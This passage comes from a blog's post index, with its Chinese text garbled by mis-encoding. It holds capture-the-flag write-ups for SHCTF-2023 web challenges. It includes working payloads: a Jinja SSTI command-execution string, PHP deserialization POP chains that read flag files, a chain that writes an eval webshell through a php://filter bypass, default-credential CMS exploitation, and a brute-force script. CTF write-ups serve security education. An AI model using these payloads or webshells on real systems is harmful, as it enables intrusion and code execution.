|\\?|mv|cp|next|show_source|highlight_file|glob|\\~|\\^|\\||\\\u0026amp;|\\*|\\%/i\u0026#34;,$code))\r{\r$code=$_GET[\u0026#39;code\u0026#39;];\rpreg_replace(\u0026#39;/(\u0026#39; . $pattern . \u0026#39;)/ei\u0026#39;,\u0026#39;print_r(\u0026#34;\\\\1\u0026#34;)\u0026#39;, $code);\recho \u0026#34;you are smart\u0026#34;;\r}else{\rdie(\u0026#34;try again\u0026#34;);\r}\r}else{\rdie(\u0026#34;it is begin\u0026#34;);\r}\r?\u0026gt; ä¸€çœ¼çœ‹åˆ°preg_matchçš„eiæ¨¡å¼ï¼Œå…¶å®è¿™ä¸ªeæ¨¡å¼æ˜¯æœ‰å‘½ä»¤æ‰§è¡Œçš„æ¼æ´çš„\nå¯ä»¥å‚è€ƒæ–‡ç« ï¼šæ·±å…¥ç ”ç©¶preg_replace \\eæ¨¡å¼ä¸‹çš„ä»£ç æ‰§è¡Œ_preg_replace /e-CSDNåšå®¢\nå¯¹äºè¿™ä¸‰ä¸ªå‚æ•°çš„è§£é‡Šï¼š\npreg_replace(æ­£åˆ™è¡¨è¾¾å¼ï¼ŒåŸæœ¬çš„å­—ç¬¦ä¸²ï¼Œç”¨äºæ›¿æ¢çš„å­—ç¬¦ä¸²); å¦‚æœåœ¨åŸæœ¬çš„å­—ç¬¦ä¸²ä¸­æ­£åˆ™åŒ¹é…æˆåŠŸï¼Œå°±å°†å…¶æ›¿æ¢\nè€Œ/eæ¨¡å¼èƒ½å¤Ÿé¡ºä¾¿æ‰§è¡Œæ›¿æ¢å­—ç¬¦ä¸²ï¼ˆå¦‚æœæ˜¯æ­£ç¡®çš„å‘½ä»¤å“ˆ\nå…·ä½“çš„ä¹Ÿä¸å¤šè¯´äº†ï¼Œä¸Šé¢å‚è€ƒæ–‡ç« å†™çš„è‚¯å®šæ¯”æˆ‘å¥½\nåœ¨phpinfoé‡Œæ‰¾åˆ°flag\nç”Ÿæˆä½ çš„é‚€è¯·å‡½å§ #\ré¢˜ç›®æè¿°ï¼š\nAPIï¼šurl/generate_invitation Requestï¼šPOST application/json Bodyï¼š{ \u0026#34;name\u0026#34;: \u0026#34;Yourname\u0026#34;, \u0026#34;imgurl\u0026#34;: \u0026#34;http://q.qlogo.cn/headimg_dl?dst_uin=QQnumb\u0026amp;spec=640\u0026amp;img_type=jpg\u0026#34; } æ ¹æ®é¢˜ç›®æè¿°ï¼Œæˆ‘ä»¬è¦ä½¿ç”¨é¶æœºå®ä¾‹çš„è¯¥APIï¼ŒPOSTå‘é€è¯·æ±‚\nè¿˜æ˜¯å¾ˆç®€å•çš„\næŠ“ä¸ªåŒ…ä¿®æ”¹ä¸€ä¸‹å³å¯\nå‘é€å®Œåï¼Œæµè§ˆå™¨ä¼šä¸‹è½½ä¸€å¼ å›¾ç‰‡ï¼Œåœ¨åº•éƒ¨å‘ç°flag\nWEEK2 #\rno_wake_up #\rphpä»£ç å¦‚ä¸‹\n\u0026lt;?php\rhighlight_file(__FILE__);\rclass flag{\rpublic $username;\rpublic $code;\rpublic function __wakeup(){\r$this-\u0026gt;username = \u0026#34;guest\u0026#34;;\r}\rpublic function __destruct(){\rif($this-\u0026gt;username = \u0026#34;admin\u0026#34;){\rinclude($this-\u0026gt;code);\r}\r}\r}\runserialize($_GET[\u0026#39;try\u0026#39;]); åœ¨ååºåˆ—åŒ–åä¼šå…ˆæ‰§è¡Œwakeupï¼Œç„¶åå†æ‰§è¡Œdestruct\nåœ¨destructé‡Œå­˜åœ¨å‘½ä»¤æ‰§è¡Œï¼Œè¿™é‡Œåªéœ€è¦ç»•è¿‡wakeupå°±è¡Œäº†\nç»å…¸çš„åªéœ€è¦æŠŠåºåˆ—åŒ–å­—ç¬¦ä¸²çš„å˜é‡å€¼æ”¹å¤§ä¸€ä¸ªå°±å¯ä»¥äº†\nä½†æ˜¯è¿™é“é¢˜ä¸çŸ¥é“æ€ä¹ˆäº†ï¼Œç›´æ¥ç”Ÿæˆçš„å­—ç¬¦ä¸²å°±èƒ½æ‰“è¿›å»\nbase64è§£ç æ‹¿åˆ°flag\nMD5çš„äº‹å°±æ‹œæ‰˜äº† #\ræºç å¦‚ä¸‹\n\u0026lt;?php\rhighlight_file(__FILE__);\rinclude(\u0026#34;flag.php\u0026#34;);\rif(isset($_POST[\u0026#39;SHCTF\u0026#39;])){\rextract(parse_url($_POST[\u0026#39;SHCTF\u0026#39;]));\rif($$$scheme===\u0026#39;SHCTF\u0026#39;){\recho(md5($flag));\recho(\u0026#34;\u0026lt;/br\u0026gt;\u0026#34;);\r}\rif(isset($_GET[\u0026#39;length\u0026#39;])){\r$num=$_GET[\u0026#39;length\u0026#39;];\rif($num*100!=intval($num*100)){\recho(strlen($flag));\recho(\u0026#34;\u0026lt;/br\u0026gt;\u0026#34;);\r}\r}\r}\rif($_POST[\u0026#39;SHCTF\u0026#39;]!=md5($flag)){\rif($_POST[\u0026#39;SHCTF\u0026#39;]===md5($flag.urldecode($num))){\recho(\u0026#34;flag is\u0026#34;.$flag);\r}\r} å…ˆgetä¼ å‚length=1.000001ï¼Œå¾—å‡ºflagçš„é•¿åº¦ä¸º42\næ³¨æ„è¿™è¿™ä¸ªparse_urlçš„ç”¨æ³•ï¼Œæ˜¯å°†ä¸€ä¸ªurlåˆ†è§£ä¸ºå‡ ä¸ªéƒ¨åˆ†ï¼Œç„¶åç”¨extractå°†å˜é‡å¼•å…¥ç¯å¢ƒ\nä¸¾ä¸ªä¾‹å­\n\u0026lt;?php$url = \u0026#39;http://username:password@hostname/path?arg=value#anchor\u0026#39;;print_r(parse_url($url));echo parse_url($url, PHP_URL_PATH);?\u0026gt;\r#é‚£ä¹ˆç»“æœå°±åº”è¯¥æ˜¯\rArray\r(\r[scheme] =\u0026gt; http\r[host] =\u0026gt; hostname\r[user] =\u0026gt; username\r[pass] =\u0026gt; password\r[path] =\u0026gt; /path\r[query] =\u0026gt; arg=value\r[fragment] =\u0026gt; anchor\r) è‡³äºè¿™ä¸ªschemeå‰é¢çš„å‡ ä¸ª$ç¬¦å·ï¼Œæ¯”å¦‚è¯´$scheme=1ï¼Œé‚£ä¹ˆ$$schemeç›¸å½“äº$1ï¼Œ$schemeçš„å€¼å°±è¢«ä½œä¸ºå˜é‡åç§°å†æ¬¡è¢«åˆ©ç”¨\nä¸‹é¢æ˜¯æµ‹è¯•ä»£ç \n\u0026lt;?php\rprint_r(parse_url(\u0026#34;host://SHCTF:password@user\u0026#34;));\rextract(parse_url(\u0026#34;host://SHCTF:password@user\u0026#34;));\recho $scheme.PHP_EOL;\recho $$scheme.PHP_EOL;\recho $$$scheme.PHP_EOL;\r#è¾“å‡ºå¦‚ä¸‹\rArray\r(\r[scheme] =\u0026gt; host\r[host] =\u0026gt; user\r[user] =\u0026gt; SHCTF\r[pass] =\u0026gt; password\r)\rhost\ruser\rSHCTF é‚£ä¹ˆè¿™ä¸ªå­—ç¬¦ä¸²å°±å¯ä»¥ä¼ å…¥POSTäº†ï¼Œæ‹¿åˆ°MD5å€¼\nåˆ°è¿™é‡Œçš„è¯ï¼Œå°±æ²¡æ€è·¯äº†ï¼Œä¸‹é¢æ˜¯å®˜æ–¹çš„wp\nEasyCMS #\rè¿›å»æ˜¯ä¸€ä¸ªç±»ä¼¼åšå®¢çš„ç•Œé¢\nè¿›è¡Œä¿¡æ¯æœé›†ï¼Œå‘ç°è¿™ä¸ªtaoCMSå­˜åœ¨æ¼æ´\nè´´ä¸€ä¸ªæ–‡ç« ï¼štaoCMSä»»æ„ä»£ç æ‰§è¡Œï¼ˆCVE-2022-25578ï¼‰-CSDNåšå®¢\nè®¿é—®åå°ç®¡ç†ç™»å½•é¡µé¢ï¼Œé»˜è®¤è´¦å·adminï¼Œå¯†ç æ˜¯tao\nåœ¨è¿™é‡Œå¯ä»¥æ‰§è¡Œsql\nä¸è¿‡flagä¸åœ¨å½“å‰æ•°æ®åº“ï¼Œåœ¨å¦å¤–ä¸€ä¸ªæ•°æ®åº“ä¸­ï¼Œå¯ä»¥ç”¨showæŸ¥çœ‹\nä½†æ˜¯è¿™é‡Œæƒ³æŸ¥ctftrainingåº“é‡Œçš„ä¸œè¥¿çš„æ—¶å€™ï¼Œä»–å°±ä¸å›æ˜¾äº†ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯æ²¡æœ‰ä¸œè¥¿\nç„¶åæ³¨æ„åˆ°å·¦ä¸‹è§’æœ‰ä¸ªæ–‡ä»¶ç®¡ç†ï¼Œé‡Œé¢å¯ä»¥ç¼–è¾‘æ–‡ä»¶å†…å®¹ï¼Œå¯ä»¥åœ¨è¿™é‡Œåšæœ¨é©¬\nå†å»è®¿é—®install.phpå³å¯å‘½ä»¤æ‰§è¡Œ\nez_ssti #\råæ§½ä¸€ä¸‹ï¼šè¿™é“é¢˜ä»€ä¹ˆä¸œè¥¿éƒ½æ²¡æœ‰ï¼Œä¼ å‚éƒ½ä¸çŸ¥é“ä¼ ä»€ä¹ˆï¼Œåæ¥è¿˜æ˜¯æœé¢˜ç›®æ‰æ‰¾åˆ°ä¼ name\nä¹Ÿæ²¡ä»€ä¹ˆå¥½å†™çš„ï¼Œç›´æ¥æ‹¿ä»¥å‰å†™è¿‡çš„payloadå°±çˆ†å‡ºæ¥äº†ï¼Œç”šè‡³éƒ½ä¸ç”¨è·‘è„šæœ¬ã€‚ã€‚ã€‚\n?name={{lipsum.__globals__.__getitem__(\u0026#39;os\u0026#39;).popen(\u0026#39;cat /f*\u0026#39;).read()}} serialize #\rä»£ç å¦‚ä¸‹ğŸ‘‡\n\u0026lt;?php\rhighlight_file(__FILE__);\rclass misca{\rpublic $gao;\rpublic $fei;\rpublic $a;\rpublic function __get($key){\r$this-\u0026gt;miaomiao();\r$this-\u0026gt;gao=$this-\u0026gt;fei;\rdie($this-\u0026gt;a);\r}\rpublic function miaomiao(){\r$this-\u0026gt;a=\u0026#39;Mikey Mouse~\u0026#39;;\r}\r}\rclass musca{\rpublic $ding;\rpublic $dong;\rpublic function __wakeup(){\rreturn $this-\u0026gt;ding-\u0026gt;dong;\r}\r}\rclass milaoshu{\rpublic $v;\rpublic function __tostring(){\recho\u0026#34;misca~musca~milaoshu~~~\u0026#34;;\rinclude($this-\u0026gt;v);\r}\r}\rfunction check($data){\rif(preg_match(\u0026#39;/^O:\\d+/\u0026#39;,$data)){\rdie(\u0026#34;you should think harder!\u0026#34;);\r}\relse return $data;\r}\runserialize(check($_GET[\u0026#34;wanna_fl.ag\u0026#34;])); å…ˆä¸ç®¡è¿™ä¸ªcheckå‡½æ•°ï¼Œç†æ¸…ä¸€ä¸‹popé“¾\næˆ‘ä»¬èƒ½å¤Ÿåˆ©ç”¨çš„æ˜¯milaoshué‡Œçš„includeå‡½æ•°ï¼Œä»–æ˜¯è¢«tostringè§¦å‘çš„ï¼Œè€Œå…¨çœ‹ä¸‹æ¥ï¼Œèƒ½å¤Ÿè§¦å‘tostringæ–¹æ³•çš„ä¹Ÿåªæœ‰miscaç±»é‡Œçš„dieæ–¹æ³•ï¼Œè¯¥æ–¹æ³•æŠŠå‚æ•°ä»¥å­—ç¬¦ä¸²è¾“å‡ºï¼Œæƒ³è¦æ‰§è¡Œçš„è¯å°±è¦æ‰§è¡Œgeté­”æœ¯æ–¹æ³•ï¼Œè¿™é‡Œè¦ä»muscaç±»é‡Œçš„wakeupå‡½æ•°é‡Œè°ƒè¿‡æ¥\næ‰€ä»¥æ€»çš„popé“¾æ¡å°±æ˜¯\nmusca-\u0026gt;__wakeup() #1\rmisca-\u0026gt;__get() #2\rmilaoshu-\u0026gt;include() #3 ä¸è¿‡è¦æ³¨æ„çš„æ˜¯åœ¨miscaçš„getæ–¹æ³•é‡Œï¼Œdieèƒ½å¤Ÿè¾“å‡ºçš„aå‚æ•°æ˜¯è¢«miaomiao()å‡½æ•°é‡æ–°èµ‹å€¼äº†\nè¿™é‡Œç›´æ¥èµ‹å€¼aæ˜¯ä¸ç®¡ç”¨çš„ï¼Œå°±åªæœ‰ä½¿ç”¨å–åœ°å€çš„æ–¹å¼ï¼ŒæŠŠgaoçš„å€¼å–ä¸ºaçš„åœ°å€ï¼Œè¿™æ ·å½“èµ‹å€¼ç»™gaoçš„æ—¶å€™ä¹Ÿå°±æ˜¯èµ‹å€¼ç»™äº†aï¼Œç»•è¿‡äº†miaomiaoå‡½æ•°\n\u0026lt;?php\rclass misca{\rpublic $gao;\rpublic $fei;\rpublic $a;\rpublic function miaomiao(){\r$this-\u0026gt;a=\u0026#39;Mikey Mouse~\u0026#39;;\r}\r}\rclass musca{\rpublic $ding;\rpublic $dong;\r}\rclass milaoshu{\rpublic $v=\u0026#39;php://filter/convert.base64-encode/resource=flag.php\u0026#39;;\r}\r$misca=new misca();\r$musca=new musca();\r$milaoshu=new milaoshu();\r$musca-\u0026gt;ding=$misca;\r$misca-\u0026gt;gao=\u0026amp;$misca-\u0026gt;a;\r$misca-\u0026gt;fei=$milaoshu;\recho serialize($musca);\r#O:5:\u0026#34;musca\u0026#34;:2:{s:4:\u0026#34;ding\u0026#34;;O:5:\u0026#34;misca\u0026#34;:3:{s:3:\u0026#34;gao\u0026#34;;N;s:3:\u0026#34;fei\u0026#34;;O:8:\u0026#34;milaoshu\u0026#34;:1:{s:1:\u0026#34;v\u0026#34;;s:52:\u0026#34;php://filter/convert.base64-encode/resource=flag.php\u0026#34;;}s:1:\u0026#34;a\u0026#34;;R:3;}s:4:\u0026#34;dong\u0026#34;;N;} ç”Ÿæˆçš„popé“¾åˆæ­¥æ˜¯è¿™æ ·çš„ï¼Œä¸è¿‡è¿™æ ·æ˜¯æ— æ³•é€šè¿‡checkå‡½æ•°\nç»è¿‡å‡ ç•ªæœå¯»ï¼Œå‘ç°åœ¨ä»¥å‰çš„CTFçš„é¢˜é‡Œé¢å‡ºç°è¿‡è¿™ä¸ªè€ƒç‚¹\npreg_match(\u0026#39;/^O:\\d+/\u0026#39;)çš„ç»•è¿‡æ–¹å¼\r1ã€åˆ©ç”¨åŠ å·ç»•è¿‡ï¼ˆæ³¨æ„åœ¨ url é‡Œä¼ å‚æ—¶ + è¦ç¼–ç ä¸º %2Bï¼‰#phpç‰ˆæœ¬å¤§äº5.6å°±ä¸è¡Œäº†å¥½åƒ\r2ã€serialize(array(a));a ä¸ºè¦ååºåˆ—åŒ–çš„å¯¹è±¡ (åºåˆ—åŒ–ç»“æœå¼€å¤´æ˜¯ aï¼Œä¸å½±å“ä½œä¸ºæ•°ç»„å…ƒç´ çš„ $a çš„ææ„) #è¿™ä¸ªå°±å¯ä»¥ æœ€ç»ˆpocå¦‚ä¸‹ğŸ‘‡\n\u0026lt;?php\rclass misca{\rpublic $gao;\rpublic $fei;\rpublic $a;\rpublic function miaomiao(){\r$this-\u0026gt;a=\u0026#39;Mikey Mouse~\u0026#39;;\r}\r}\rclass musca{\rpublic $ding;\rpublic $dong;\r}\rclass milaoshu{\rpublic $v=\u0026#39;php://filter/convert.base64-encode/resource=flag.php\u0026#39;;\r}\r$misca=new misca();\r$musca=new musca();\r$milaoshu=new milaoshu();\r$musca-\u0026gt;ding=$misca;\r$misca-\u0026gt;gao=\u0026amp;$misca-\u0026gt;a;\r$misca-\u0026gt;fei=$milaoshu;\recho serialize($musca);\recho PHP_EOL;\r$x=serialize(array($musca));\recho $x;\r#a:1:{i:0;O:5:\u0026#34;musca\u0026#34;:2:{s:4:\u0026#34;ding\u0026#34;;O:5:\u0026#34;misca\u0026#34;:3:{s:3:\u0026#34;gao\u0026#34;;N;s:3:\u0026#34;fei\u0026#34;;O:8:\u0026#34;milaoshu\u0026#34;:1:{s:1:\u0026#34;v\u0026#34;;s:52:\u0026#34;php://filter/convert.base64-encode/resource=flag.php\u0026#34;;}s:1:\u0026#34;a\u0026#34;;R:4;}s:4:\u0026#34;dong\u0026#34;;N;}} WEEK3 #\rå¿«é—®å¿«ç­” #\rå†™ä¸ªè„šæœ¬çˆ†ç ´å°±è¡Œï¼Œä½†æ˜¯æ—¢ä¸èƒ½å¤ªå¿«ä¹Ÿä¸èƒ½å¤ªæ…¢ï¼ŒæœåŠ¡å™¨å¥½åƒæ’‘ä¸ä½ã€‚ã€‚ã€‚\nimport re\rimport time\rimport requests\rsession=requests.session()\rurl=\u0026#39;http://112.6.51.212:31707\u0026#39;\rpattern=re.compile(\u0026#39;(\\d+) (.+) (\\d+) =\u0026#39;)\rresult=0\rpayload={\u0026#34;answer\u0026#34;:f\u0026#39;{result}\u0026#39;}\rfor i in range(65):\rtime.sleep(1)\rtry:\rr=session.post(url,payload)\rprint(r.text)\rcalc=re.findall(pattern,r.text)[0]\rnum1=calc[0]\rsym=calc[1]\rnum2=calc[2]\rif \u0026#39;å¼‚æˆ–\u0026#39; == sym:\rresult=int(num1)^int(num2)\rif \u0026#39;ä¸\u0026#39; == sym:\rresult=int(num1)\u0026amp;int(num2)\rif \u0026#39;Ã·\u0026#39; ==sym:\rresult=int(int(num1)/int(num2))\rif \u0026#39;x\u0026#39; ==sym:\rresult=int(num1)*int(num2)\rif \u0026#39;+\u0026#39; == sym:\rresult = int(num1) + int(num2)\rif \u0026#39;-\u0026#39; ==sym:\rresult = int(num1) - int(num2)\rpayload = {\u0026#34;answer\u0026#34;: f\u0026#39;{result}\u0026#39;}\rprint(i,calc,result)\rexcept IndexError :\rprint(r.text)\rprint(\u0026#39;indexx error\u0026#39;)\rexit()\rexcept InterruptedError:\rprint(\u0026#34;interupt\u0026#34;)\relse:\rpass\rtime.sleep(0.5)\rprint(r.text)\rprint(r.cookies) sseerriiaalliizzee #\rphpæºç å¦‚ä¸‹ğŸ‘‡\n\u0026lt;?php\rerror_reporting(0);\rhighlight_file(__FILE__);\rclass Start{\rpublic $barking;\rpublic function __construct(){\r$this-\u0026gt;barking = new Flag;\r}\rpublic function __toString(){\rreturn $this-\u0026gt;barking-\u0026gt;dosomething();\r}\r}\rclass CTF{ public $part1;\rpublic $part2;\rpublic function __construct($part1=\u0026#39;\u0026#39;,$part2=\u0026#39;\u0026#39;) {\r$this -\u0026gt; part1 = $part1;\r$this -\u0026gt; part2 = $part2;\r}\rpublic function dosomething(){\r$useless = \u0026#39;\u0026lt;?php die(\u0026#34;+Genshin Impact Start!+\u0026#34;);?\u0026gt;\u0026#39;;\r$useful= $useless. $this-\u0026gt;part2;\rfile_put_contents($this-\u0026gt; part1,$useful);\r}\r}\rclass Flag{\rpublic function dosomething(){\rinclude(\u0026#39;./flag,php\u0026#39;);\rreturn \u0026#34;barking for fun!\u0026#34;;\r}\r}\r$code=$_POST[\u0026#39;code\u0026#39;]; if(isset($code)){\recho unserialize($code);\r}\relse{\recho \u0026#34;no way, fuck off\u0026#34;;\r}\r?\u0026gt; å…³é”®ç‚¹åœ¨äºCTFç±»é‡Œçš„dosomethingå‡½æ•°ï¼Œè¿™é‡Œé¢æœ‰ä¸€ä¸ªfile_put_contentså¯ä»¥åˆ©ç”¨\nä½†æ˜¯æ–‡ä»¶å†…å®¹æ˜¯æœ‰ä¸€ä¸ªdieå‡½æ•°ï¼Œå½“æˆ‘ä»¬è®¿é—®ç”Ÿæˆçš„æ–‡ä»¶æ—¶ï¼Œèµ°åˆ°dieå‡½æ•°å°±ç»“æŸï¼Œè‡ªå·±å†™çš„å†…å®¹å°±æ— æ•ˆäº†\nè¿™é‡Œè´´ä¸€ä¸ªåšå®¢ï¼šfile_put_contentsåˆ©ç”¨æŠ€å·§(php://filteråè®®ï¼‰ - yokan - åšå®¢å›­ (cnblogs.com)è®²çš„å¾ˆä¸é”™çš„\nè¿™é‡Œå°±åˆ©ç”¨filterä¼ªåè®®æ­é…è¿‡æ»¤å™¨ç»•è¿‡è¿™ä¸ªfile_put_contentså°±å¯ä»¥äº†\nç”Ÿæˆååºåˆ—åŒ–å­—ç¬¦ä¸²çš„pocğŸ‘‡\n\u0026lt;?php\rclass Start{\rpublic $barking;\r}\rclass CTF{\rpublic $part1=\u0026#39;php://filter/write=string.strip_tags|convert.base64-decode/resource=hyh.php\u0026#39;;\rpublic $part2=\u0026#39;PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==\u0026#39;;# @eval($_POST[a]);\r}\r$a=new Start();\r$b=new CTF();\r$a-\u0026gt;barking=$b;\recho serialize($a);\r#O:5:\u0026#34;Start\u0026#34;:1:{s:7:\u0026#34;barking\u0026#34;;O:3:\u0026#34;CTF\u0026#34;:2:{s:5:\u0026#34;part1\u0026#34;;s:75:\u0026#34;php://filter/write=string.strip_tags|convert.base64-decode/resource=hyh.php\u0026#34;;s:5:\u0026#34;part2\u0026#34;;s:36:\u0026#34;PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==\u0026#34;;}} gogogo #\rè¿™é“é¢˜çš„è¯ï¼Œç½‘ä¸Šä¹Ÿèƒ½æœåˆ°ç±»ä¼¼çš„é¢˜ç›®\nç”±äºæ²¡æœ‰æ‰“é€šï¼Œè¿™é‡Œè¿˜æ˜¯è´´ä¸€ä¸‹å®˜æ–¹çš„wp\ngoè¯­è¨€çš„ç¯å¢ƒè¦è‡ªå·±å®‰è£…ï¼Œå®‰è£…å¥½åæŠŠé¢˜ç›®é™„ä»¶é‡Œçš„ä»£ç sessionéƒ¨åˆ†ä¿®æ”¹å¦‚å›¾\nç„¶åä¼šè·‘å‡ºæ¥ä¸€ä¸ªcookieï¼Œè¿™é‡Œburpæ›´æ¢cookieå³å¯ç»•è¿‡ç¬¬ä¸€å…³\n","date":"2023-10-02","externalUrl":null,"permalink":"/posts/2023/10/shctf-2023/","section":"Posts","summary":"","title":"SHCTF-2023","type":"posts"},{"content":"\rWeek1 #\ræ³„æ¼çš„ç§˜å¯† #\rhintï¼šç²—å¿ƒçš„ç½‘ç«™ç®¡ç†å‘˜æ€»ä¼šæ³„æ¼ä¸€äº›æ•æ„Ÿä¿¡æ¯åœ¨Webæ ¹ç›®å½•ä¸‹\nè®¿é—®è¯¥ç½‘ç«™ç›®å½•ä¸‹çš„robots.txtå¯ä»¥æ‰¾åˆ°ç¬¬ä¸€éƒ¨åˆ†çš„flag\næ‰«æä¸€ä¸‹åå°ï¼Œå‘ç°www.zipå¤‡ä»½æ–‡ä»¶ï¼Œå°†å…¶ä¸‹è½½ä¸‹æ¥ï¼Œåœ¨index.phpä¸­å‘ç°ç¬¬äºŒéƒ¨åˆ†flag\nBegin of Upload #\rhintï¼šæ™®é€šçš„ä¸Šä¼ å•¦ï¼Œå¹³å¹³æ·¡æ·¡æ‰æ˜¯çœŸ\nåœ¨ç½‘é¡µæºä»£ç é‡Œå‘ç°å‰ç«¯æ£€æµ‹çš„è„šæœ¬\næˆ‘è¿™é‡Œç”¨çš„æ˜¯Edgeæµè§ˆå™¨ï¼Œå¯ä»¥åœ¨è®¾ç½®é‡Œå…³æ‰JavaScriptï¼Œç„¶ååˆ·æ–°ä¸€ä¸‹é¡µé¢\nç„¶åå°±èƒ½ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼Œä»–è¿™é‡Œæ²¡æœ‰åç«¯æ£€æµ‹\næ ¹ç›®å½•ä¸‹æ‹¿åˆ°flag\nBegin of HTTP #\rhintï¼šæœ€åˆçš„å¼€å§‹\nhackbarä¼ å‚å°±è¡Œ\nsecretåœ¨ç½‘é¡µæºä»£ç é‡Œçš„æ³¨é‡Šé‡Œ\n\u0026lt;!-- Secret: base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk) --\u0026gt; base64è§£å¯†ä¸€ä¸‹å†ä¼ å‚å°±è¡Œ\nF12æ‰“å¼€ç½‘ç»œï¼ŒæŸ¥çœ‹å½“å‰é¡µé¢çš„æ¶ˆæ¯å¤´ï¼Œåœ¨cookieé‡Œé¢å‘ç°powerå‚æ•°\nhackbaré‡Œå¯ä»¥ä¼ cookie\næµè§ˆå™¨å°±æ˜¯user agent\nä»æŸä¸ªç½‘ç«™æ¥è®¿é—®ç”¨Refererè¡¨ç¤º\nåˆ°è¿™é‡Œï¼Œæˆ‘çš„hackbarå°±æ— æ³•ç”¨äº†ï¼Œå¯èƒ½æ˜¯ç‰ˆæœ¬å¤ªè€ï¼Œè¿˜æ˜¯å¾—æ‰“å¼€burpsuiteï¼ŒæŠ“ä¸€ä¸‹ç›®å‰çš„hackbaré‡Œçš„åŒ…\næœ¬åœ°ç”¨æˆ·ä¼ªé€ çš„è¯ï¼Œæ¯”è¾ƒå¸¸è§çš„å°±æ˜¯X-Forwaded-For (ç»å…¸çš„XFFå¤´)ï¼Œæˆ–è€…Client-Ipç­‰ç­‰\nè¿™é‡Œèƒ½ä½¿ç”¨çš„æ˜¯X-Real-Ipï¼ŒæŠ“ä¸ªåŒ…æ·»åŠ è¿™ä¸ªheaderå°±èƒ½å¾—åˆ°flag\næœ€ç»ˆå¦‚å›¾ğŸ‘‡\nErrorFlask #\rhintï¼šErr\u0026hellip;\u0026hellip;..\nè¿›å»é¢˜ç›®è¦æ±‚ä¼ number1å’Œnumber2æ¥è¿›è¡ŒåŠ æ³•æ“ä½œ\nä½†æ˜¯æ ¹æ®é¢˜ç›®ï¼Œåªéœ€è¦ä¼ ä¸€ä¸ªå‚æ•°æ¥å¯¼è‡´ä»£ç æŠ¥é”™ï¼Œç„¶åè¿›å…¥debugæ¨¡å¼å°±è¡Œäº†\nBegin of PHP #\rhintï¼šPHPæ˜¯ä¸–ç•Œä¸Šæœ€å®‰å…¨çš„è¯­è¨€ï¼ŒçœŸçš„å—ï¼Ÿ\nif(isset($_GET[\u0026#39;key1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;key2\u0026#39;])){\recho \u0026#34;=Level 1=\u0026lt;br\u0026gt;\u0026#34;;\rif($_GET[\u0026#39;key1\u0026#39;] !== $_GET[\u0026#39;key2\u0026#39;] \u0026amp;\u0026amp; md5($_GET[\u0026#39;key1\u0026#39;]) == md5($_GET[\u0026#39;key2\u0026#39;])){\r$flag1 = True;\r}else{\rdie(\u0026#34;nope,this is level 1\u0026#34;);\r}\r} è¿™é‡Œè¦æ±‚key1ä¸ç­‰äºkey2ï¼Œç„¶åMD5å€¼è¦å¼±ç›¸ç­‰ï¼Œç®€å•ä¸€ç‚¹çš„è¯å°±æ˜¯å°†key1å’Œkey2éƒ½ä»¥æ•°ç»„çš„å½¢å¼ä¼ å‚ï¼ŒMD5æ˜¯åŠ å¯†æ•°ç»„ä¼šè¿”å›NULLï¼Œæ‰€ä»¥ååŠéƒ¨åˆ†å°±å˜æˆäº† NULL==NULL\nå¦ä¸€ä¸ªæ–¹æ³•å°±æ˜¯md5ç¢°æ’ï¼Œç”±äºåé¢ä¸ºå¼±æ¯”è¾ƒåªæ¯”è¾ƒå˜é‡å€¼æ•°å€¼ï¼Œåªéœ€è¦ç”¨ä¸¤ä¸ªMD5å€¼ä¸º0eå¼€å¤´çš„å°±èƒ½ç»•è¿‡ï¼ˆç§‘å­¦è®¡æ•°æ³•ï¼Œ0eå¼€å¤´çš„è®¡ç®—å€¼éƒ½æ˜¯0ï¼‰\nè¿™é‡Œç”¨æ•°ç»„å°±è¡Œ\nif($flag1){\recho \u0026#34;=Level 2=\u0026lt;br\u0026gt;\u0026#34;;\rif(isset($_POST[\u0026#39;key3\u0026#39;])){\rif(md5($_POST[\u0026#39;key3\u0026#39;]) === sha1($_POST[\u0026#39;key3\u0026#39;])){\r$flag2 = True;\r}\r}else{\rdie(\u0026#34;nope,this is level 2\u0026#34;);\r}\r} SHA1å’ŒMD5ä¸€æ ·éƒ½æ˜¯ä¸èƒ½åŠ å¯†æ•°ç»„çš„ï¼Œéƒ½ä¼šè¿”å›NULLï¼Œç„¶è€Œè¿™é‡Œæ˜¯å¼ºæ¯”è¾ƒï¼Œåªèƒ½ç”¨æ•°ç»„ç»•è¿‡\nif($flag2){\recho \u0026#34;=Level 3=\u0026lt;br\u0026gt;\u0026#34;;\rif(isset($_GET[\u0026#39;key4\u0026#39;])){\rif(strcmp($_GET[\u0026#39;key4\u0026#39;],file_get_contents(\u0026#34;/flag\u0026#34;)) == 0){\r$flag3 = True;\r}else{\rdie(\u0026#34;nope,this is level 3\u0026#34;);\r}\r}\r} strcmpæ¯”è¾ƒçš„æ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼Œå¦‚æœå¼ºè¡Œä¼ å…¥å…¶ä»–ç±»å‹å‚æ•°ï¼Œä¼šå‡ºé”™ï¼Œå‡ºé”™åè¿”å›å€¼0ï¼Œä¸€æ ·ç”¨æ•°ç»„ç»•è¿‡\nif($flag3){\recho \u0026#34;=Level 4=\u0026lt;br\u0026gt;\u0026#34;;\rif(isset($_GET[\u0026#39;key5\u0026#39;])){\rif(!is_numeric($_GET[\u0026#39;key5\u0026#39;]) \u0026amp;\u0026amp; $_GET[\u0026#39;key5\u0026#39;] \u0026gt; 2023){\r$flag4 = True;\r}else{\rdie(\u0026#34;nope,this is level 4\u0026#34;);\r}\r}\r} è¿™é‡Œè¦æ±‚key5ä¸æ˜¯æ•°å­—ï¼Œä½†æ˜¯å‘¢key5åˆè¦å¤§äº2023\nè¿˜æ˜¯æ•°ç»„ç»•è¿‡ï¼Œå› ä¸ºç§‘å­¦è®¡æ•°æ³•ä¹Ÿç®—æ•°å­—ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªç‚¹ï¼šæ•°ç»„ä¸æ•°å­—æ¯”è¾ƒï¼Œæ°¸è¿œæ˜¯æ•°ç»„å¤§äºæ•°å­—ï¼Œå³ä½¿æ•°ç»„ä¸ºç©ºï¼Œè¿™æ˜¯PHPå†…éƒ¨è§„å®š\nif($flag4){\recho \u0026#34;=Level 5=\u0026lt;br\u0026gt;\u0026#34;;\rextract($_POST);\rforeach($_POST as 